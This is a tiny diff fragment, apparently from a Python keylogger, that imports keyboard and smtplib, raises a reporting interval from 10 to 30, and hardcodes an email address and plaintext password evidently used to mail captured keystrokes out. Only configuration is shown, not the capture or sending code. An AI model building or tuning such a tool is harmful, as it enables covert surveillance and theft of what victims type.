@@ -2,7 +2,7 @@ import keyboard
 import smtplib
 from threading import Semaphore, Timer
 
-INTERVAL = 10
+INTERVAL = 30
 EMAIL = 'k3yl0gg3rt3st@gmail.com'
 PASSWORD = 'temp@123'
 
